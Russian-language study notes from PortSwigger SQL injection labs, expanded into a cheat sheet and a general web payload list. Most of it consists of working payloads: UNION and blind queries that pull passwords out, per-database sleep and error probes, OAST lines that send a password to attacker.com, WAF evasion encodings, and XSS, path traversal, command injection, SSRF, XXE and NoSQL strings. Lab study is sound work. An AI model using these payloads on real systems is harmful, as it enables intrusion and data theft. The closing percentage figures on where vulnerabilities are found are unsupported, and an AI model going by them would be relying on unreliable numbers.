1 лаба =  разное в ответе число байт
' and 1 = 1--

2 лаба разное в ответе число байт
   --
'

3 лаба разное в ответе число байт
' ORDER BY 1--  
' UNION SELECT NULL,NULL,NULL--
'-- 

4 - 7 лабы тут срабатывал простой тест кавычкой

8 лаба   разное в ответе число байт
' AND (SE LECT * FROM dual)=1--
' AND (SELECT 1)=1--
' AND (SELECT @@version)=1--
' или ' ' разное в ответе число байт

9 лаба (вызывать ошибку намеренно )

' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
 ' AND (SELECT COUNT(*) FROM all_tables WHERE table_name='USERS')>1--


10 лаба вывод ошибки - превращение в видимую иньекциию
'||(SELECT '' FROM not-a-real-table)||'
' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a 
CAST('text' AS int)  → ОШИБКА

'||(SELECT '' FROM dual)||'--      - ошбка - не оракл
' OR (SELECT '')=''--                      - работает значит MYSQl
' AND CONCAT('a','b')='ab'--     - работает значит MySQL
'||(SELECT '' WHERE ...)||'--        - ошибка - не постеджер
'||(SELECT '')||'--                             - работает - хз че это тогда 
' AND 'a'||'b'='ab'--                          -тоже работает
не обрезается ли запрос?
' AND 1=CAST((SELECT 'f') AS int)--

11 лаба временные задержки
' AND (SELECT CASE WHEN (1=1) THEN LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB(100000000)))) ELSE 0 END)=1--
'||LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))--
'||(SELECT randomblob(100000000))--
'||(SELECT COUNT(*) FROM sqlite_master a,sqlite_master b,sqlite_master c)--


' AND (SELECT CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(10) ELSE 0 END FROM dual)=0--
'||DBMS_LOCK.SLEEP(10)--
'||(SELECT COUNT(*) FROM all_objects a,all_objects b,all_objects c) FROM dual--

' AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE (SELECT COUNT(*) FROM sys.objects o1, sys.objects o2, sys.objects o3, sys.objects o4, sys.objects o5, sys.objects o6) END)--
'||sleep(10)--
'||BENCHMARK(10000000,MD5('test'))--
'||IF(1=1,SLEEP(10),0)--

' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END) IS NOT NULL--
'||pg_sleep(10)-- 
'||(SELECT COUNT(*) FROM generate_series(1,10000000))--

12 лаба нагрузочные тесты
'||(SELECT COUNT(*) FROM generate_series(1,1000000))--
'||(SELECT COUNT(*) FROM generate_series(1,100))--

13 oast

14 не строковые а цифровые пейлоады


------
-------
------

# === Базовые символы-разведчики (универсальные) ===

'

"

`

')

")

`)

'))

"))

`))

[

{

{

{

`

  

# === Проверка контекста и логики (универсальные) ===

1+1

2-1

-1

1*56

' OR '1'='1

" OR "1"="1

' OR 'a'='a

' AND '1'='1

' AND '1'='2

' OR 1=1

' OR 1=2

  

# === Комментирование остатка запроса (разные СУБД) ===

'-- 

'--+

'--

'# 

'/*test*/

')-- 

')--+

')#

')/*test*/

  

# === Провокация Boolean-based Blind SQLi (универсальные) ===

' AND '1'='1' AND '1'='1

' AND '1'='2' AND '1'='1

' OR '1'='2' OR '1'='1

admin' AND '1'='1

admin' AND '1'='2

  

# === Провокация Time-based Blind SQLi (БД-специфичные) ===

# MySQL / MariaDB

' OR SLEEP(2)-- 

' OR BENCHMARK(5000000,MD5('test'))-- 

' OR (SELECT * FROM (SELECT(SLEEP(2)))a)-- 

  

# PostgreSQL

' OR pg_sleep(2)-- 

' OR (SELECT pg_sleep(2))-- 

  

# Microsoft SQL Server

' WAITFOR DELAY '0:0:2'-- 

' OR (SELECT count(*) FROM sys.objects,sys.objects b)--  # Ресурсоемкий запрос

  

# SQLite (редко на вебе)

' OR (SELECT randomblob(1000000000))--  # Попытка создать большую нагрузку

  

# Oracle

' OR (SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual)--  # Может вызвать задержку


Вызвать ошибки mysql

  

  

' AND 1=0 AND (SELECT 1) IS NOT NULL -- 

' AND (SELECT 1 FROM (SELECT 1) a) -- 

' AND (SELECT 1) IN (SELECT 2) -- 

' AND (SELECT 1 UNION SELECT 2) -- 

' OR (SELECT 1)='2

' AND CAST('test' AS SIGNED INTEGER) -- 

' AND 1/0 -- 

' AND (SELECT 1/0 FROM DUAL) --

' OR EXP(~(SELECT*FROM(SELECT 1)x...

Ошибки postgere

  

  

' AND 1337=CAST('~'||(SELECT version())::text||'~' AS NUMERIC) -- - [citation:6]

' AND CAST((SELECT version()) AS INT)=1337 -- - [citation:6]

' AND (SELECT version())::int=1 --

' AND 1/0 --

' AND 'a'=5 --

' OR (SELECT 1)='2

Ошибки Microsoft server

  

  

' AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- - [citation:9]

' AND 1337 IN (SELECT ('~'+(SELECT @@version)+'~')) -- - [citation:9]

' AND CAST((SELECT @@version) AS INT)=1337 --

' AND 1/0 --

' AND 'a'=5 --

Ошибки oracle 

  

' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1)) --

' AND (SELECT 1 FROM DUAL)='2

' AND TO_NUMBER('test')=1 --

' AND (SELECT NULL FROM DUAL) IS NOT NULL --

' OR (SELECT 1 FROM DUAL)='2


Ошибки sqllite

' AND 1=2 AND (SELECT 1) IS NOT NULL --

' AND (SELECT 1) IN (SELECT 2) --

' OR (SELECT 1)='2

' AND abs(1/0) --  (попытка деления на ноль)

' AND CAST('test' AS INTEGER) --








'
"
`
')
")
`)
'))
"))
`))
--
; 
# 
/* 
*/ 
\ 
|| 
&& 
+ 
-


UNION
SELECT
FROM
WHERE
AND
OR
ORDER
BY
TABLE
COLUMN
DATABASE
INFORMATION_SCHEMA





----------
----------
----------

вызвать ошибку
вызвать задержку временем
вызвать задержку вычислениями
закоментить часть запроса
выполнить логическое действие



# ОБЩИЕ БАЗОВЫЕ ЛОМАЮЩИЕ SQL



# POSTGER 

# MYSQL

# SQLLITE

# ORACLE

# MICROSOFT SERVER


4 крайние лабы где нужно было выводить бд

слип - не срабатывал
еррор - не сработывал
но србатывал обычный order by 1...
и union select null,null.....

ну п потом определив число столбцов и их тип

я выводил данные! 

сначала версии

@@version
version()
baner from v$version  это у оракл так

'union+select+banner,+null+from+v$version--

помним - что для вывода данных нужно выводить в столбце и в типе стринг
поэтому просто так не вывести данные! сперва узнать число столбцов через order by
или юнион селект null,null...


для оракл специфичные ALL+SELECT, baner, 
не information_chema.tables а вот так all_tables
all_tab_columns вместо information_chema.columns


'UNION+ALL+SELECT+banner,+NULL+FROM+v$version-- вывело все сразу!

'UNION+SELECT+banner,+NULL+FROM+v$version-- вывело только линукс!

# 📚 **КОМПЛЕКТНЫЙ КОНСПЕКТ SQL INJECTION (PortSwigger Labs)**

## 🎯 **КЛАССИФИКАЦИЯ SQLi**

### **1. In-band (классические)**

- **Union-based** — через UNION извлекаем данные
    
- **Error-based** — через ошибки СУБД получаем данные
    

### **2. Blind (слепые)**

- **Boolean-based** — разный ответ при TRUE/FALSE
    
- **Time-based** — используем временные задержки
    
- **Out-of-band (OAST)** — через DNS/HTTP запросы
    

### **3. По контексту**

- **Строковый** — `WHERE name = '[INJECTION]'`
    
- **Числовой** — `WHERE id = [INJECTION]`
    
- **В ORDER BY/LIMIT** — `ORDER BY [INJECTION]`
    

---

## 🔧 **БАЗОВЫЕ ТЕХНИКИ**

### **Разведка (всегда сначала):**

sql

'   "   `   ')   ")   `)
'--   "--   #   /*comment*/
' OR '1'='1
' AND '1'='1
' AND '1'='2

### **Определение числа столбцов:**

sql

' ORDER BY 1--     -- увеличиваем до ошибки
' UNION SELECT NULL--  -- добавляем NULL

### **Определение типа СУБД:**

sql

-- MySQL: ' AND @@version IS NOT NULL--
-- PostgreSQL: ' AND version() IS NOT NULL--
-- Oracle: ' AND (SELECT '' FROM dual)=''--
-- MSSQL: ' AND @@version IS NOT NULL--

---

## 💥 **UNION-BASED АТАКИ (Лабы 1-4)**

### **Шаги:**

1. **Найти уязвимый параметр** (', ")
    
2. **Определить число столбцов** (ORDER BY или UNION NULL)
    
3. **Найти строковые столбцы** (подставляем 'a')
    
4. **Использовать UNION для извлечения**
    

### **Примеры:**

sql

-- Вывести все таблицы (PostgreSQL/MySQL)
' UNION SELECT table_name,NULL FROM information_schema.tables--

-- Вывести столбцы таблицы users
' UNION SELECT column_name,NULL FROM information_schema.columns 
WHERE table_name='users'--

-- Вывести данные
' UNION SELECT username||'~'||password,NULL FROM users--

---

## 🕵️ **BLIND SQLi (Слепые инъекции)**

### **Boolean-based (Лаба 1):**

sql

-- Проверка существования таблицы
' AND (SELECT 'a' FROM users LIMIT 1)='a'--

-- Поиск пароля посимвольно
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

### **Error-based (Лабы 2-3):**

sql

-- Провоцируем ошибку при TRUE условии
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a

-- Извлекаем данные через ошибку (PostgreSQL)
' AND 1=CAST((SELECT password FROM users) AS int)--

### **Time-based (Лабы 4-5):**

sql

-- MySQL
' AND SLEEP(5)--
' || BENCHMARK(10000000,MD5('test'))--

-- PostgreSQL
' AND pg_sleep(5)--
' || (SELECT COUNT(*) FROM generate_series(1,10000000))--

-- Oracle
' AND DBMS_LOCK.SLEEP(5)=0--

-- MSSQL
' WAITFOR DELAY '0:0:5'--

### **Out-of-band (OAST) (Лаба 6):**

sql

-- DNS exfiltration
' || (SELECT load_file(concat('\\\\',(SELECT password),'.attacker.com\\test')))--

-- HTTP exfiltration  
' || UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password))--

---

## 🛡️ **ОБХОД WAF (Лаба 7)**

### **Кодировки:**

sql

-- URL encoding
%27 %20%4f%52%20%27%31%27%3d%27%31

-- HTML entities
&#x31; &#x55;&#x4e;&#x49;&#x4f;&#x4e; &#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;

-- Double URL encoding
%2527 %2520%2541%254e%2544 %2531%253d%2531

### **Обфускация:**

sql

-- Разделение ключевых слов
SEL/**/ECT * FR/**/OM users

-- Использование синонимов
' OR 1 LIKE 1--   вместо ' OR 1=1--

### **Для числовых параметров:**

sql

3-1    -- если возвращает 2, значит параметр числовой
3 AND 1=1
3 AND 1=2

---

## 🗄️ **ОПРЕДЕЛЕНИЕ И ИССЛЕДОВАНИЕ БД**

### **Версии СУБД:**

sql

-- MySQL: @@version
-- PostgreSQL: version()
-- Oracle: SELECT banner FROM v$version
-- MSSQL: @@version
-- SQLite: sqlite_version()

### **Структура БД:**

sql

-- MySQL/PostgreSQL
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Oracle
SELECT table_name FROM all_tables
SELECT column_name FROM all_tab_columns WHERE table_name='USERS'

-- MSSQL
SELECT name FROM sysobjects WHERE xtype='U'
SELECT name FROM syscolumns WHERE id=OBJECT_ID('users')

---

## 🎮 **ПРАКТИЧЕСКИЕ ПОДХОДЫ**

### **Алгоритм тестирования:**

text

1. Базовые символы: ' " ` -- #
2. Boolean тесты: AND 1=1, AND 1=2
3. Определение СУБД
4. UNION/Error-based тесты
5. Если не работает → Blind тесты
6. Если полная слепота → OAST

### **Для слепых SQLi:**

text

1. Проверить разницу: ' AND '1'='1 vs ' AND '1'='2
2. Если есть разница → Boolean-based
3. Если нет → Time-based тесты
4. Если не реагирует → OAST
## ⚡ **БЫСТРЫЕ ЧЕК-ЛИСТЫ**

### **Чек-лист обнаружения:**

- `'` — вызывает ошибку?
    
- `'--` — ошибка исчезает?
    
- `' AND '1'='1` — нормальный ответ?
    
- `' AND '1'='2` — другой ответ?
    
- `' UNION SELECT NULL--` — работает?
    
- `' AND SLEEP(5)--` — задержка?
### **Чек-лист эксплуатации:**

text

1. Найти уязвимость
2. Определить тип SQLi
3. Определить СУБД  
4. Определить контекст
5. Подобрать payload
6. Извлечь данные

### **Из опыта:**

1. **Разные методы работают в разных ситуациях** — где-то только time-based, где-то только union
    
2. **WAF нужно обходить кодировками** — HTML/URL/double encoding
    
3. **Числовые параметры** — проверять через `1+1`, `3-1`
    
4. **Длина запроса** — может обрезаться, укорачивать payload
    
5. **Контекст важен** — строковый vs числовой vs ORDER BY

##  **ТАБЛИЦА ФУНКЦИЙ ПО СУБД**

```c
##  **ТАБЛИЦА ФУНКЦИЙ ПО СУБД**

|Действие|MySQL|PostgreSQL|Oracle|MSSQL|SQLite|
|---|---|---|---|---|---|
|**Версия**|`@@version`|`version()`|`banner FROM v$version`|`@@version`|`sqlite_version()`|
|**Sleep**|`SLEEP(5)`|`pg_sleep(5)`|`DBMS_LOCK.SLEEP(5)`|`WAITFOR DELAY '0:0:5'`|`randomblob()`|
|**Подстрока**|`SUBSTRING()`|`SUBSTRING()`|`SUBSTR()`|`SUBSTRING()`|`SUBSTR()`|
|**Конкатенация**|`CONCAT()`|`\|`|`\|`|`+`|`\|`|
|**Комментарий**|`--` , `#`|`--`, `/* */`|`--`|`--`, `/* */`|`--`|
```





### обход waf 

Методы используются для обхода средств защиты, таких как брандмауэры веб-приложений (WAF) или системы предотвращения вторжений (IPS). 

#### Пробел

Отбрасывание пробелов или добавление пробелов, которые не повлияют на оператор SQL. Например

```sql
or 'a'='a'

or 'a'  =    'a'
```

Добавление специального символа, такого как новая строка или табуляция, которые не изменят выполнение оператора SQL. Например,

```sql
or
'a'=
        'a'
```

#### Нулевые байты

Используйте нулевой байт (%00) перед любыми символами, которые фильтр блокирует.

Например, если злоумышленник может внесить следующий SQL

`' UNION SELECT password FROM Users WHERE username='admin'--`

добавить Null Bytes будет

`%00' UNION SELECT password FROM Users WHERE username='admin'--`

#### Комментарии SQL

Добавление встроенных комментариев SQL также может помочь оператору SQL быть действительным и обойти фильтр SQL-инъекции. Возьмем эту SQL-инъекцию в качестве примера.

`' UNION SELECT password FROM Users WHERE name='admin'--`

Добавление встроенных комментариев SQL будет.

`'/**/UNION/**/SELECT/**/password/**/FROM/**/Users/**/WHERE/**/name/**/LIKE/**/'admin'--`

`'/**/UNI/**/ON/**/SE/**/LECT/**/password/**/FROM/**/Users/**/WHE/**/RE/**/name/**/LIKE/**/'admin'--`

#### Кодирование URL-адресов

Используйте [онлайн](https://meyerweb.com/eric/tools/dencoder/)-[кодирование URL-адреса](https://meyerweb.com/eric/tools/dencoder/) для кодирования оператора SQL

`' UNION SELECT password FROM Users WHERE name='admin'--`

Кодирование URL-адреса оператора SQL-инъекции будет

`%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--`

#### Кодирование символов

Функция Char() может быть использована для замены английского char. Например, char(114,111,111,116) означает корень

`' UNION SELECT password FROM Users WHERE name='root'--`

Чтобы применить Char(), оператор SQL injectiton будет

`' UNION SELECT password FROM Users WHERE name=char(114,111,111,116)--`

#### Конкатенация строк

Concatenation разбивает ключевые слова SQL и уклоняется от фильтров. Синтаксис конкатенации варьируется в зависимости от механизма базы данных. Возьмем в качестве примера движок MS SQL

`select 1`

Простая инструкция SQL может быть изменена, как показано ниже, используя конкатенацию

`EXEC('SEL' + 'ECT 1')`

#### Шестиденатексное Кодирование

Hex encoding technique uses Hexadecimal encoding to replace original SQL statement char. For example, `root` can be represented as `726F6F74`

`Select user from users where name = 'root'`

Оператор SQL с использованием значения HEX будет:

`Select user from users where name = 726F6F74`

или

`Select user from users where name = unhex('726F6F74')`

#### Объявить переменные

Объявите оператор SQL-инъекции в переменную и выполните его.

Например, инструкция SQL-инъекции ниже

`Union Select password`

Определите инструкцию SQL в переменную`SQLivar`

```sql
; declare @SQLivar nvarchar(80); set @myvar = N'UNI' + N'ON' + N' SELECT' + N'password');
EXEC(@SQLivar)
```

#### Альтернативное выражение 'или 1 = 1'

```sql
OR 'SQLi' = 'SQL'+'i'
OR 'SQLi' &gt; 'S'
or 20 &gt; 1
OR 2 between 3 and 1
OR 'SQLi' = N'SQLi'
1 and 1 = 1
1 || 1 = 1
1 && 1 = 1
```











#  PAY_LOAD_s SQLi простые общие примеры....

```c

# =============================================
# БАЗОВЫЕ СИНТАКСИЧЕСКИЕ ТЕСТЫ (САМЫЕ БЕЗОПАСНЫЕ)
# =============================================
'
"
`
;
--
-- 
# 
/* 
*/ 
')
")
'))
\\

# =============================================
# SQL INJECTION (ERROR-BASED, БЕЗ ИЗМЕНЕНИЯ ДАННЫХ)
# =============================================
' AND '1'='1
' AND '1'='2
" AND "1"="1
" AND "1"="2
1 AND 1=1
1 AND 1=2
' OR '1'='1
' OR '1'='2
' AND 1=CAST('test' AS INT)--
' OR (SELECT 1/0)--
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
' AND 1=(SELECT COUNT(*) FROM tabname)--
' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--

# =============================================
# UNION-BASED SQLi (БЕЗОПАСНЫЕ ПРОВЕРКИ)
# =============================================
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,'test',NULL--
' UNION SELECT @@version,NULL--
' UNION SELECT version(),NULL--
' UNION SELECT user(),NULL--
' UNION SELECT database(),NULL--

# =============================================
# TIME-BASED SQLi (МИНИМАЛЬНЫЕ ЗАДЕРЖКИ)
# =============================================
' AND SLEEP(1)--
' OR SLEEP(1)--
' AND (SELECT * FROM (SELECT(SLEEP(1)))a)--
';SELECT SLEEP(1)--
' AND BENCHMARK(100000,MD5('test'))--
' WAITFOR DELAY '0:0:1'--
' AND pg_sleep(1)--

# =============================================
# XSS (БЕЗОПАСНЫЕ ПРОВЕРКИ, НЕ ВОРУЮТ ДАННЫЕ)
# =============================================
"><script>alert(1)</script>
'><script>alert(1)</script>
"><img src=x onerror=alert(1)>
javascript:alert(1)
" onmouseover="alert(1)
' onmouseover='alert(1)
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<a href="javascript:alert(1)">click</a>

# =============================================
# PATH TRAVERSAL / LFI (ТОЛЬКО ПРОВЕРКИ)
# =============================================
../../../etc/passwd
..\..\..\windows\win.ini
....//....//....//etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
/etc/passwd
c:\windows\win.ini
.../.../.../etc/passwd

# =============================================
# COMMAND INJECTION (БЕЗОПАСНЫЕ КОМАНДЫ)
# =============================================
;echo test
|echo test
&echo test
`echo test`
$(echo test)
||echo test
&&echo test
;id
|id
&id
`id`
$(id)
;whoami
|whoami

# =============================================
# SSRF (БЕЗОПАСНЫЕ АДРЕСА, ТОЛЬКО ПРОВЕРКА)
# =============================================
http://169.254.169.254/latest/meta-data/
http://localhost:80
http://127.0.0.1:80
http://[::1]:80
http://0.0.0.0:80
file:///etc/passwd
gopher://localhost:80
dict://localhost:80

# =============================================
# HOST HEADER INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
evil.com
example.com:80@evil.com
example.com\r\nInjected-Header: test
localhost
127.0.0.1
169.254.169.254
example.com.bad.com
-example.com

# =============================================
# COOKIE INJECTION (БЕЗОПАСНЫЕ ПРОВЕРКИ)
# =============================================
' OR '1'='1
" OR "1"="1
admin
true
1
../etc/passwd
..././..././etc/passwd
${jndi:ldap://test}

# =============================================
# USER-AGENT INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
Mozilla/5.0 ' OR '1'='1
Mozilla/5.0 <script>alert(1)</script>
() { :; }; echo test
Mozilla/5.0\" OR \"1\"=\"1

# =============================================
# REFERER INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
https://evil.com
javascript:alert(1)
data:text/html,<script>alert(1)</script>
http://localhost
http://127.0.0.1
example.com@evil.com

# =============================================
# CONTENT-TYPE MANIPULATION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
application/json
text/xml
multipart/form-data; boundary=test
text/html"><script>alert(1)</script>
application/x-www-form-urlencoded' OR '1'='1

# =============================================
# WAF BYPASS (БЕЗОПАСНЫЕ ОБХОДЫ)
# =============================================
%27
%2527
%bf%27
%2D%2D
%23
SEL%0bECT
UNI%0dON
'/**/OR/**/1=1--
'%0aOR%0a'1'='1
' AND 1 LIKE 1--
1' and@'1'='1
'%20OR%20'1'='1

# =============================================
# JSON INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
{"id":"1'"}
{"id":"1' OR '1'='1"}
{"id":"1\" OR \"1\"=\"1"}
{"id":{"$ne":1}}
{"id":{"$regex":".*"}}

# =============================================
# XXE (БЕЗОПАСНЫЕ ПРОВЕРКИ)
# =============================================
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>

# =============================================
# NO-SQL INJECTION (БЕЗОПАСНЫЕ ТЕСТЫ)
# =============================================
{"$ne": null}
{"$ne": 1}
{"$regex": ".*"}
{"$where": "1==1"}
' || '1'=='1
' || 1==1
' && 1==1





```
## **ТАБЛИЦА: КАЖДАЯ СТРОЧКА → ВОЗМОЖНЫЕ АТАКИ**

|  Строка запроса  |  Основные атаки  |     Пример payload    |   Риск  | 



|**URL параметры** (`id=1`)|SQLi, XSS, Path traversal, Command injection, SSRF|`1' OR '1'='1`, `../../../etc/passwd`|ВЫСОКИЙ|


|**Host header**|Host injection, Cache poisoning, SSRF|`evil.com`, `localhost`|СРЕДНИЙ|

|**User-Agent**|XSS, Log injection, Command injection|`<script>alert(1)</script>`|НИЗКИЙ|

|**Cookies**|Session hijacking, SQLi, Path traversal|`' OR '1'='1`, `../etc/passwd`|ВЫСОКИЙ|

|**Accept header**|Content-type manipulation, XSS|`text/html"><script>`|НИЗКИЙ|

|**Referer**|Open redirect, Referer-based auth bypass|`javascript:alert(1)`|СРЕДНИЙ|

|**Content-Type**|Content-type confusion, XSS|`application/json`|НИЗКИЙ|

|**Тело запроса**|ВСЁ выше + NoSQLi, XXE|`admin'--`, `{$ne: null}`|



### **ВО ВСЕ ТЕКСТОВЫЕ ПОЛЯ можно:**

1. **SQLi тесты** (`'`, `"`, `' OR '1'='1`)
    
2. **XSS тесты** (`<script>alert(1)</script>`)
    
3. **Path traversal** (`../../../etc/passwd`)
    

### **📌 ТОЛЬКО В URL/Теле запроса:**

- **Command injection** (`;id`, `|whoami`)
    
- **SSRF** (`http://169.254.169.254/`)
    

### **📌 ТОЛЬКО В ЗАГОЛОВКАХ:**

- **Host header attacks** (подмена хоста)
    
- **Cache poisoning** (через X-Forwarded-Host)
    

### **📌 ТОЛЬКО В СПЕЦИФИЧНЫХ ПОЛЯХ:**

- **NoSQLi** → только если backend использует MongoDB
    
- **XXE** → только если парсится XML
    
- **JSONi** → только если `Content-Type: application/json`
    

## 🔧 **КАК ТЕСТИРОВАТЬ СИСТЕМАТИЧНО:**

1. **Начните с параметров URL** — там чаще всего уязвимости
    
2. **Потом тело запроса** (если POST)
    
3. **Затем Cookies** — часто забывают валидировать
    
4. **Потом заголовки** (Host, User-Agent, Referer)
    
5. **В конце специфичные тесты** (NoSQLi, XXE, JSONi)
    

## ⚠️ **ВАЖНОЕ ПРАВИЛО:**

eсли поле принимает ввод пользователя → оно потенциально уязвимо

разница только в **вероятности** и **последствиях**:

- **Параметры URL**: 90% SQLi/XSS находят здесь
    
- **Cookies**: 70% уязвимостей контроля доступа
    
- **Заголовки**: 30% обходов WAF/фильтров
    
- **Тело запроса**: 50% уязвимостей в API